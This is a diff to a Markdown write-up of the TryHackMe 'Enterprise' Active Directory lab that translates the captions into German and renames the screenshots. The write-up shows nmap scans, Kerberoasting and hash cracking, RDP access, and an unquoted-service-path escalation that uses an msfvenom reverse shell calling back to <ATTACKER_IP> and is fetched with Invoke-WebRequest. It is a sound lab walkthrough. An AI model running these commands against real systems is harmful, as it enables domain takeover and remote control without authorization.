@@ -1,9 +1,6 @@
 # Enterprise - TryHackMe Writeup
 
 **Platform:** [TryHackMe - Enterprise](https://tryhackme.com/room/enterprise)
-
-**Target:** Windows Active Directory Domain Controller
-
 **Difficulty:** Hard
 
 > This writeup documents an authorized TryHackMe lab. Target and AttackBox addresses are ephemeral, so the commands use `<TARGET_IP>` and `<ATTACKER_IP>`. Lab passwords, Kerberos material, and both flags are redacted from the public screenshots.
@@ -33,7 +30,7 @@ The scan exposed the typical surface of an Active Directory Domain Controller, p
 - Active Directory Web Services on 9389
 
 ![Full TCP scan](images/01_full_tcp_scan.png)
-*The full TCP scan reveals the broad Active Directory and Windows management attack surface.*
+*Der vollständige TCP-Scan zeigt die breite Angriffsfläche aus Active-Directory- und Windows-Management-Diensten.*
 
 I then ran default scripts and version detection against the identified services:
 
@@ -44,10 +41,10 @@ nmap -Pn -sC -sV -p 53,80,88,135,139,389,445,464,593,636,3268,3269,3389,5985,799
 Nmap identified the host as `LAB-DC`, the realm as `LAB.ENTERPRISE.THM`, Microsoft IIS 10.0, LDAP, Kerberos, SMB, RDP, WinRM, and an Atlassian login on port 7990.
 
 ![Active Directory service scan](images/02_service_scan_active_directory.png)
-*Service detection identifies the Windows domain, host name, LDAP, Kerberos, SMB, IIS, and RDP services.*
+*Die Service-Erkennung identifiziert Domain und Hostname sowie LDAP, Kerberos, SMB, IIS und RDP.*
 
 ![Atlassian service on port 7990](images/03_service_scan_atlassian.png)
-*The second part of the service scan identifies the Atlassian login on port 7990 and the host name LAB-DC.*
+*Der zweite Teil des Service-Scans zeigt das Atlassian-Login auf Port 7990 und den Hostnamen LAB-DC.*
 
 ---
 
@@ -63,10 +60,8 @@ Browsing the Atlassian application on port 7990 revealed the message **“We are
 
 An older commit had removed hard-coded credentials for the domain user `nik`. The recovered password is deliberately redacted here and represented as `<NIK_PASSWORD>` throughout this public writeup.
 
-![Historic GitHub credential commit](images/github-credential-commit-redacted.png)
-*An older commit of the PowerShell management script exposed the nik lab credential; the password is redacted in this public copy.*
-
-No standalone screenshots were captured for the `/etc/hosts` change, the Atlassian message, or the intermediate GitHub organization/user navigation. The historic commit itself is documented above.
+![Historic GitHub credential commit](images/04_github_credential_commit.png)
+*Ein älterer Commit des PowerShell-Skripts legt die Zugangsdaten von nik offen. Passwort geschwärzt.*
 
 ---
 
@@ -96,8 +91,8 @@ The `Docs` share contained two protected Office documents:
 
 They were a secondary lead and were not required for the successful attack path.
 
-![SMB shares and Docs content](images/smb-shares-docs-redacted.png)
-*Authenticated SMB enumeration lists the shares and both protected Office files; the password is redacted.*
+![SMB shares and Docs content](images/05_smb_shares_docs.png)
+*Authentifizierte SMB-Enumeration listet die Shares und beide geschützten Office-Dateien. Passwort geschwärzt.*
 
 ---
 
@@ -124,8 +119,8 @@ john --show kerberoast.hashes
 
 John recovered the synthetic lab password for `bitbucket`. It is represented as `<BITBUCKET_PASSWORD>` below and is redacted from the screenshot together with the reusable Kerberos material.
 
-![Kerberoasting and John](images/kerberoast-john-redacted.png)
-*GetUserSPNs identifies HTTP/LAB-DC for bitbucket, and John cracks the ticket; credential material is redacted.*
+![Kerberoasting and John](images/06_kerberoast_john.png)
+*GetUserSPNs findet HTTP/LAB-DC für bitbucket, John knackt das Ticket. Hash und Passwort geschwärzt.*
 
 ---
 
@@ -137,13 +132,13 @@ The cracked service-account credential provided an interactive RDP session:
 xfreerdp /v:<TARGET_IP> /u:bitbucket /p:<BITBUCKET_PASSWORD> /d:LAB.ENTERPRISE.THM /cert:ignore
 ```
 
-![RDP login](images/rdp-login-redacted.png)
-*The FreeRDP session was launched as bitbucket; the password is redacted.*
+![RDP login](images/07_rdp_login.png)
+*Die FreeRDP-Sitzung wird als bitbucket gestartet. Passwort geschwärzt.*
 
 The user flag was present on the `bitbucket` desktop. Its value is intentionally not reproduced.
 
-![User flag redacted](images/user-flag-redacted.png)
-*The user flag was recovered from the bitbucket desktop and redacted for publication.*
+![User flag redacted](images/08_user_flag.png)
+*User-Flag auf dem Desktop von bitbucket. Flag geschwärzt.*
 
 ---
 
@@ -159,8 +154,8 @@ sc.exe qc zerotieroneservice
 - Runs as `LocalSystem`
 - Unquoted binary path: `C:\Program Files (x86)\Zero Tier\Zero Tier One\ZeroTier One.exe`
 
-![ZeroTier service configuration](images/07_zerotier_service_config.png)
-*The service runs as LocalSystem and uses an unquoted executable path containing spaces.*
+![ZeroTier service configuration](images/09_zerotier_service_config.png)
+*Der Dienst läuft als LocalSystem und nutzt einen ungequoteten Binärpfad mit Leerzeichen.*
 
 The existing executable itself was not writable by a standard user:
 
@@ -170,8 +165,8 @@ icacls "C:\Program Files (x86)\Zero Tier\Zero Tier One\ZeroTier One.exe"
 
 `BUILTIN\Users` had only inherited read and execute rights on `ZeroTier One.exe`.
 
-![ZeroTier executable ACL](images/08_zerotier_binary_acl.png)
-*The original service executable is protected from direct replacement.*
+![ZeroTier executable ACL](images/10_zerotier_binary_acl.png)
+*Die originale Service-Binary ist gegen direktes Überschreiben geschützt - BUILTIN\Users hat nur Lese- und Ausführungsrechte.*
 
 The installation directory had weaker permissions:
 
@@ -185,8 +180,8 @@ The installation directory had weaker permissions:
 C:\Program Files (x86)\Zero Tier\Zero Tier One\ZeroTier.exe
 ```
 
-![ZeroTier directory ACL](images/09_zerotier_directory_acl.png)
-*The installation folder is writable by BUILTIN\Users, enabling placement of the truncated ZeroTier.exe candidate.*
+![ZeroTier directory ACL](images/11_zerotier_directory_acl.png)
+*Das Installationsverzeichnis ist für BUILTIN\Users beschreibbar - damit lässt sich der Kandidat ZeroTier.exe ablegen.*
 
 ---
 
@@ -198,8 +193,8 @@ On the AttackBox, I generated a 64-bit reverse shell executable. The resulting f
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=4444 -f exe -o ZeroTier.exe
 ```
 
-![msfvenom payload](images/10_msfvenom_payload.png)
-*msfvenom creates the 7,680-byte ZeroTier.exe reverse-shell payload.*
+![msfvenom payload](images/12_msfvenom_payload.png)
+*msfvenom erzeugt die 7.680 Byte große Reverse Shell ZeroTier.exe.*
 
 The payload was served over HTTP:
 
@@ -214,8 +209,8 @@ Invoke-WebRequest -Uri "http://<ATTACKER_IP>:8000/ZeroTier.exe" -OutFile "C:\Pro
 Get-Item "C:\Program Files (x86)\Zero Tier\Zero Tier One\ZeroTier.exe" | Select-Object FullName,Length
 ```
 
-![Payload HTTP transfer](images/11_payload_http_transfer.png)
-*The AttackBox HTTP server returns the payload to the target with status 200.*
+![Payload HTTP transfer](images/13_payload_http_transfer.png)
+*Der HTTP-Server der AttackBox liefert das Payload mit Status 200 an das Target aus.*
 
 ---
 
@@ -233,8 +228,8 @@ The service was then started from the RDP session:
 sc.exe start zerotieroneservice
 ```
 
-![Payload deployment and service trigger](images/12_payload_deployment_and_trigger.png)
-*The payload is present at the expected path and the service start is triggered. Error 1053 appears because the reverse-shell executable does not behave like a Windows service, but execution already occurred.*
+![Payload deployment and service trigger](images/14_payload_deployment_and_trigger.png)
+*Das Payload liegt am erwarteten Pfad, der Dienststart wird ausgelöst. Fehler 1053 erscheint, weil die Reverse Shell sich nicht wie ein Windows-Dienst verhält - ausgeführt wurde sie trotzdem.*
 
 The listener received the callback. `whoami` confirmed `nt authority\system`, after which the root flag was read from the Administrator desktop:
 
@@ -243,19 +238,8 @@ whoami
 type C:\Users\Administrator\Desktop\root.txt
 ```
 
-![SYSTEM shell and root flag](images/system-shell-root-flag-redacted.png)
-*The callback runs as NT AUTHORITY\SYSTEM. The root flag is redacted from the public image.*
-
----
-
-## Evidence Notes
-
-- All public flag, password, and Kerberos material is redacted.
-- No standalone screenshot exists for the `/etc/hosts` modification.
-- No standalone screenshot exists for the Atlassian **“We are moving to Github!”** hint.
-- No standalone screenshot exists for the intermediate GitHub organization and user navigation.
-- The protected Office files were enumerated but were not part of the successful path.
-- A truncated service-list screenshot and duplicate ACL captures were omitted because clearer evidence was available.
+![SYSTEM shell and root flag](images/15_system_shell_root_flag.png)
+*Der Callback läuft als NT AUTHORITY\SYSTEM. Root-Flag geschwärzt.*
 
 ---
 
